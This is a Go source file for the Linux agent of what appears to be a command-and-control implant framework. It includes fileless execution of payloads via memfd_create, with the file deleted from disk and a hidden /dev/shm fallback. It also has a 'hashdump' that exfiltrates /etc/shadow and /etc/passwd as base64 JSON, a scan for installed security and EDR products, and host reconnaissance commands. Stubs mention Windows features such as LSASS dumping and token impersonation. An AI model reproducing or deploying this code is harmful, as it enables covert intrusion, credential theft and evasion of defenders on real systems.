//go:build linux

package native

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"syscall"
	"unsafe"

	"tornadoc2/agent/protocol"
)

type (
	Task   = protocol.Task
	Result = protocol.Result
)

func NativeID() (string, error) {
	u, err := user.Current()
	if err != nil {
		uid := syscall.Getuid()
		gid := syscall.Getgid()
		return fmt.Sprintf("uid=%d gid=%d\n", uid, gid), nil
	}

	uid, _ := strconv.Atoi(u.Uid)
	gid, _ := strconv.Atoi(u.Gid)

	groups, _ := syscall.Getgroups()
	groupStr := ""
	for i, g := range groups {
		if i > 0 {
			groupStr += ","
		}
		groupStr += strconv.Itoa(g)
	}

	return fmt.Sprintf(
		"uid=%d(%s) gid=%d(%s) groups=%s\n",
		uid, u.Username, gid, u.Name, groupStr,
	), nil
}

func NativePS() (string, error) {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return "", err
	}

	type proc struct {
		pid  int
		comm string
		cmd  string
	}
	var procs []proc

	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		pid, err := strconv.Atoi(e.Name())
		if err != nil {
			continue
		}

		comm, _ := os.ReadFile(filepath.Join("/proc", e.Name(), "comm"))
		cmdline, _ := os.ReadFile(filepath.Join("/proc", e.Name(), "cmdline"))

		p := proc{
			pid:  pid,
			comm: strings.TrimSpace(string(comm)),
		}
		if len(cmdline) > 0 {
			p.cmd = strings.ReplaceAll(
				strings.TrimRight(string(cmdline), "\x00"), "\x00", " ")
		}
		if p.cmd == "" {
			p.cmd = p.comm
		}
		procs = append(procs, p)
	}

	sort.Slice(procs, func(i, j int) bool {
		return procs[i].pid < procs[j].pid
	})

	var sb strings.Builder
	sb.WriteString("PID      COMMAND\n")
	for _, p := range procs {
		cmd := p.cmd
		if len(cmd) > 200 {
			cmd = cmd[:197] + "..."
		}
		sb.WriteString(fmt.Sprintf("%-8d %s\n", p.pid, cmd))
	}
	return sb.String(), nil
}

func NativeStatExtra(path string) string {
	var sb strings.Builder
	st, err := os.Stat(path)
	if err != nil {
		return ""
	}
	if sys, ok := st.Sys().(*syscall.Stat_t); ok {
		fmt.Fprintf(&sb, "Uid      : %d\n", sys.Uid)
		fmt.Fprintf(&sb, "Gid      : %d\n", sys.Gid)
		if u, err := user.LookupId(strconv.FormatUint(uint64(sys.Uid), 10)); err == nil {
			fmt.Fprintf(&sb, "User     : %s\n", u.Username)
		}
		if g, err := user.LookupGroupId(strconv.FormatUint(uint64(sys.Gid), 10)); err == nil {
			fmt.Fprintf(&sb, "Group    : %s\n", g.Name)
		}
	}
	return sb.String()
}

func NativeDF(args []string) (string, error) {
	path := "/"
	if len(args) > 0 {
		path = args[0]
	}
	var st syscall.Statfs_t
	if err := syscall.Statfs(path, &st); err != nil {
		return "", err
	}
	bsize := uint64(st.Bsize)
	total := st.Blocks * bsize
	free := st.Bfree * bsize
	avail := st.Bavail * bsize
	used := total - free
	usePct := 0.0
	if total > 0 {
		usePct = float64(used) * 100 / float64(total)
	}
	return fmt.Sprintf(
		"Path       : %s\n"+
			"Block size : %d\n"+
			"Total      : %d bytes (%.1f GiB)\n"+
			"Used       : %d bytes (%.1f GiB)\n"+
			"Available  : %d bytes (%.1f GiB)\n"+
			"Use%%       : %.1f%%\n",
		path, bsize,
		total, float64(total)/(1<<30),
		used, float64(used)/(1<<30),
		avail, float64(avail)/(1<<30),
		usePct,
	), nil
}

func NativeUptime() (string, error) {
	data, err := os.ReadFile("/proc/uptime")
	if err != nil {
		return "", err
	}
	parts := strings.Fields(string(data))
	if len(parts) < 1 {
		return "", fmt.Errorf("malformed /proc/uptime")
	}
	secs, err := strconv.ParseFloat(parts[0], 64)
	if err != nil {
		return "", err
	}
	days := int(secs) / 86400
	hours := (int(secs) % 86400) / 3600
	mins := (int(secs) % 3600) / 60
	return fmt.Sprintf("up %d day(s), %d hour(s), %d minute(s) (%d seconds)\n",
		days, hours, mins, int(secs)), nil
}

func ExecELFInMemory(ctx context.Context, path string,
	args []string) (string, int, error) {

	data, err := os.ReadFile(path)
	if err != nil {
		return "", -1, fmt.Errorf("read payload: %w", err)
	}

	_ = os.Remove(path)

	fd, err := memfdCreate("payload")
	if err != nil {
		return ExecELFViaShm(ctx, data, args)
	}
	defer syscall.Close(fd)

	if _, err := syscall.Write(fd, data); err != nil {
		return "", -1, fmt.Errorf("write memfd: %w", err)
	}

	if err := syscall.Fchmod(fd, 0700); err != nil {
		return "", -1, fmt.Errorf("fchmod memfd: %w", err)
	}

	procPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	cmd := exec.CommandContext(ctx, procPath, args...)
	cmd.Env = sanitizedEnv()
	cmd.ExtraFiles = []*os.File{os.NewFile(uintptr(fd), procPath)}

	combined, err := cmd.CombinedOutput()
	exitCode := 0
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			exitCode = ee.ExitCode()
		} else {
			return string(combined), -1, err
		}
	}
	return string(combined), exitCode, nil
}

func ExecPEInMemory(_ context.Context, _ string,
	_ []string) (string, int, error) {
	return "", -1, errors.New("pe in-memory execution requires a Windows target")
}

func memfdCreate(name string) (int, error) {
	var nr uintptr
	switch runtime.GOARCH {
	case "amd64", "386":
		nr = 319
	case "arm64":
		nr = 279
	case "arm":
		nr = 385
	case "riscv64":
		nr = 279
	case "ppc64", "ppc64le":
		nr = 360
	case "s390x":
		nr = 350
	case "mips", "mipsle", "mips64", "mips64le":
		nr = 354
	default:
		return -1, errors.New("memfd_create unsupported on " + runtime.GOARCH)
	}

	nameBytes, err := syscall.BytePtrFromString(name)
	if err != nil {
		return -1, err
	}

	r, _, errno := syscall.Syscall(
		nr,
		uintptr(unsafe.Pointer(nameBytes)),
		uintptr(0x0001),
		0,
	)
	if errno != 0 {
		return -1, errno
	}
	return int(r), nil
}

func ExecELFViaShm(ctx context.Context, data []byte,
	args []string) (string, int, error) {

	f, err := os.CreateTemp("/dev/shm", ".exec")
	if err != nil {
		return "", -1, fmt.Errorf("create temp: %w", err)
	}
	tmp := f.Name()

	if _, err := f.Write(data); err != nil {
		f.Close()
		os.Remove(tmp)
		return "", -1, fmt.Errorf("write temp: %w", err)
	}
	if err := f.Chmod(0700); err != nil {
		f.Close()
		os.Remove(tmp)
		return "", -1, fmt.Errorf("chmod temp: %w", err)
	}
	f.Close()

	cmd := exec.CommandContext(ctx, tmp, args...)
	cmd.Env = sanitizedEnv()

	combined, err := cmd.CombinedOutput()
	_ = os.Remove(tmp)

	exitCode := 0
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			exitCode = ee.ExitCode()
		} else {
			return string(combined), -1, err
		}
	}
	return string(combined), exitCode, nil
}

func ExecBOF(_ context.Context, _ []byte,
	_ string, _ []byte) (string, int, error) {
	return "", -1, errors.New("BOF execution requires a Windows target")
}

func parseProcHexAddr(hexAddr string, isV6 bool) string {
	nBytes := 4
	if isV6 {
		nBytes = 16
	}
	if len(hexAddr) != nBytes*2 {
		return hexAddr
	}
	raw := make([]byte, nBytes)
	nWords := nBytes / 4
	for w := 0; w < nWords; w++ {
		for b := 0; b < 4; b++ {
			src := w*8 + (3-b)*2
			v, err := strconv.ParseUint(hexAddr[src:src+2], 16, 8)
			if err != nil {
				return hexAddr
			}
			raw[w*4+b] = byte(v)
		}
	}
	return net.IP(raw).String()
}

func tcpStateName(hexState string) string {
	switch strings.ToUpper(hexState) {
	case "01":
		return "ESTABLISHED"
	case "02":
		return "SYN_SENT"
	case "03":
		return "SYN_RECV"
	case "04":
		return "FIN_WAIT1"
	case "05":
		return "FIN_WAIT2"
	case "06":
		return "TIME_WAIT"
	case "07":
		return "CLOSE"
	case "08":
		return "CLOSE_WAIT"
	case "09":
		return "LAST_ACK"
	case "0A":
		return "LISTEN"
	case "0B":
		return "CLOSING"
	}
	return hexState
}

func NativeNetstat(t Task) (string, error) {
	var sb strings.Builder
	sb.WriteString("Proto  Local Address                " +
		"Remote Address               State\n")

	files := []struct {
		path  string
		proto string
		isV6  bool
		isUDP bool
	}{
		{"/proc/net/tcp", "tcp", false, false},
		{"/proc/net/tcp6", "tcp6", true, false},
		{"/proc/net/udp", "udp", false, true},
		{"/proc/net/udp6", "udp6", true, true},
	}
	for _, f := range files {
		data, err := os.ReadFile(f.path)
		if err != nil {
			continue
		}
		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
		if len(lines) < 2 {
			continue
		}
		for _, line := range lines[1:] {
			fields := strings.Fields(line)
			if len(fields) < 4 {
				continue
			}
			local := parseProcHexAddr(
				strings.SplitN(fields[1], ":", 2)[0], f.isV6)
			lport, _ := strconv.ParseUint(
				strings.SplitN(fields[1], ":", 2)[1], 16, 16)
			remote := parseProcHexAddr(
				strings.SplitN(fields[2], ":", 2)[0], f.isV6)
			rport, _ := strconv.ParseUint(
				strings.SplitN(fields[2], ":", 2)[1], 16, 16)

			state := tcpStateName(fields[3])
			if f.isUDP && fields[3] == "07" {
				state = "UNCONN"
			}

			la := fmt.Sprintf("%s:%d", local, lport)
			ra := fmt.Sprintf("%s:%d", remote, rport)
			fmt.Fprintf(&sb, "%-5s  %-27s %-27s %s\n",
				f.proto, la, ra, state)
		}
	}
	return sb.String(), nil
}

func NativeArp(t Task) (string, error) {
	data, err := os.ReadFile("/proc/net/arp")
	if err != nil {
		return "", err
	}
	lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
	if len(lines) < 2 {
		return "Address                  HWtype  Flags  HWaddress           Iface\n", nil
	}

	var sb strings.Builder
	sb.WriteString("Address                  HWtype  Flags  " +
		"HWaddress            Iface\n")
	for _, line := range lines[1:] {
		fields := strings.Fields(line)
		// ip hwtype flags hwaddr mask device
		if len(fields) < 6 {
			continue
		}
		fmt.Fprintf(&sb, "%-24s %-7s %-6s %-20s %s\n",
			fields[0], fields[1], fields[2], fields[3], fields[5])
	}
	return sb.String(), nil
}

func NativeRoute(t Task) (string, error) {
	data, err := os.ReadFile("/proc/net/route")
	if err != nil {
		return "", err
	}
	lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
	if len(lines) < 2 {
		return "Destination      Gateway          Genmask          " +
			"Flags  Iface\n", nil
	}

	var sb strings.Builder
	sb.WriteString("Destination      Gateway          Genmask          " +
		"Flags  Iface\n")
	for _, line := range lines[1:] {
		fields := strings.Fields(line)
		// iface dest gateway flags refcnt use metric mask ...
		if len(fields) < 8 {
			continue
		}
		dest := parseProcHexAddr(fields[1], false)
		gw := parseProcHexAddr(fields[2], false)
		mask := parseProcHexAddr(fields[7], false)
		fmt.Fprintf(&sb, "%-16s %-16s %-16s %-6s %s\n",
			dest, gw, mask, fields[3], fields[0])
	}
	return sb.String(), nil
}

func NativeUsers(t Task) (string, error) {
	data, err := os.ReadFile("/etc/passwd")
	if err != nil {
		return "", err
	}
	var sb strings.Builder
	sb.WriteString("User           UID    GID    Home                        Shell\n")
	sb.WriteString("========================================================================\n")
	for _, line := range strings.Split(string(data), "\n") {
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.Split(line, ":")
		if len(parts) < 7 {
			continue
		}
		fmt.Fprintf(&sb, "%-14s %-6s %-6s %-27s %s\n",
			parts[0], parts[2], parts[3], parts[5], parts[6])
	}
	return sb.String(), nil
}

func NativeGroups(t Task) (string, error) {
	data, err := os.ReadFile("/etc/group")
	if err != nil {
		return "", err
	}
	var sb strings.Builder
	sb.WriteString("Group          GID    Members\n")
	sb.WriteString("==================================================================\n")
	for _, line := range strings.Split(string(data), "\n") {
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.Split(line, ":")
		if len(parts) < 4 {
			continue
		}
		members := parts[3]
		if len(members) > 44 {
			members = members[:41] + "..."
		}
		fmt.Fprintf(&sb, "%-14s %-6s %s\n",
			parts[0], parts[2], members)
	}
	return sb.String(), nil
}

var avUnits = []string{
	"clamav-daemon.service",
	"clamav-freshclam.service",
	"clamd.service",
	"falco.service",
	"falco-modern-bpf.service",
	"wazuh-agent.service",
	"ossec.service",
	"auditd.service",
	"falcon-sensor.service",
	"sentinelone.service",
	"sophos-spl.service",
	"sophos.service",
	"splunkforwarder.service",
	"filebeat.service",
	"metricbeat.service",
	"packetbeat.service",
	"ds_agent.service",
	"cbagentd.service",
	"carbonblack.service",
	"rapid7-agent.service",
	"ir_agent.service",
	"nessusd.service",
	"qualys-cloud-agent.service",
	"tripwire.service",
	"aide.service",
}

func NativeAvList(t Task) (string, error) {
	unitDirs := []string{
		"/etc/systemd/system",
		"/run/systemd/system",
		"/usr/lib/systemd/system",
		"/lib/systemd/system",
	}

	seen := make(map[string]string)
	for _, dir := range unitDirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			name := e.Name()
			if seen[name] != "" {
				continue
			}
			stem := strings.TrimSuffix(name, ".service")
			for _, known := range avUnits {
				kstem := strings.TrimSuffix(known, ".service")
				if strings.EqualFold(stem, kstem) {
					seen[name] = filepath.Join(dir, name)
					break
				}
			}
		}
	}

	enabled := make(map[string]bool)
	for _, dir := range []string{
		"/etc/systemd/system/multi-user.target.wants",
		"/etc/systemd/system/default.target.wants",
	} {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			enabled[e.Name()] = true
		}
	}

	var sb strings.Builder
	sb.WriteString("Security products (systemd units)\n")
	sb.WriteString("===============================================================\n")

	if len(seen) == 0 {
		sb.WriteString("(no known security product units found)\n")
		return sb.String(), nil
	}

	names := make([]string, 0, len(seen))
	for n := range seen {
		names = append(names, n)
	}
	sort.Strings(names)

	for _, n := range names {
		state := "present"
		if enabled[n] {
			state = "enabled"
		}
		fmt.Fprintf(&sb, "%-40s %-8s %s\n",
			n, state, seen[n])
	}
	return sb.String(), nil
}

func NativeScreenshot(_ Task) (string, error) {
	return "", errors.New(
		"screenshot is not implemented on Linux: neither X11 nor " +
			"Wayland framebuffer capture is reachable from the Go " +
			"standard library, and the framework does not fork a " +
			"helper. Download a capture tool and run it through " +
			"`exec` instead.")
}

func NativeWhoamiPriv(_ Task) (string, error) {
	return "", errors.New(
		"whoami /priv is only available on Windows")
}

func NativeHashdump(t Task) (string, error) {
	passwdData, err := os.ReadFile("/etc/passwd")
	if err != nil {
		return "", fmt.Errorf("hashdump: read /etc/passwd: %w", err)
	}

	shadowData, shadowErr := os.ReadFile("/etc/shadow")
	var shadowErrStr string
	if shadowErr != nil {
		shadowErrStr = shadowErr.Error()
	}

	shadowHashes := make(map[string]string)
	if shadowData != nil {
		for _, line := range strings.Split(string(shadowData), "\n") {
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			fields := strings.SplitN(line, ":", 3)
			if len(fields) < 2 {
				continue
			}
			shadowHashes[fields[0]] = fields[1]
		}
	}

	var sb strings.Builder
	combined := 0
	for _, line := range strings.Split(string(passwdData), "\n") {
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		fields := strings.Split(line, ":")
		if len(fields) < 2 {
			continue
		}
		hash, ok := shadowHashes[fields[0]]
		if !ok {
			continue
		}
		fields[1] = hash
		sb.WriteString(strings.Join(fields, ":"))
		sb.WriteByte('\n')
		combined++
	}

	passwdHash := sha256.Sum256(passwdData)

	env := map[string]interface{}{
		"passwd_b64":     base64.StdEncoding.EncodeToString(passwdData),
		"passwd_sha256":  hex.EncodeToString(passwdHash[:]),
		"combined":       sb.String(),
		"combined_count": combined,
	}
	if shadowData != nil {
		h := sha256.Sum256(shadowData)
		env["shadow_b64"] = base64.StdEncoding.EncodeToString(shadowData)
		env["shadow_sha256"] = hex.EncodeToString(h[:])
	}
	if shadowErrStr != "" {
		env["shadow_error"] = shadowErrStr
	}

	out, err := json.Marshal(env)
	if err != nil {
		return "", err
	}
	return string(out), nil
}

func NativeEnablePriv(_ Task) (string, error) {
	return "", errors.New(
		"enablepriv is Windows-only (no process-token privilege " +
			"model on Linux; POSIX capabilities are per-executable " +
			"and cannot be added to a running process)")
}

func NativeLsassDump(_ Task) (string, error) {
	return "", errors.New(
		"lsassdump is Windows-only (LSASS does not exist on Linux)")
}

func NativeMakeToken(_ Task) (string, error) {
	return "", errors.New(
		"make_token is Windows-only. On Linux, use `su` or " +
			"`sudo -u <user>` via `exec` to run a child under " +
			"another identity.")
}

func NativeRev2Self(_ Task) (string, error) {
	return "", errors.New(
		"rev2self is Windows-only (no process token model on Linux)")
}

func NativeRunas(_ Task) (string, error) {
	return "", errors.New(
		"runas is Windows-only. On Linux, use `su -c` or " +
			"`sudo -u` via `exec`.")
}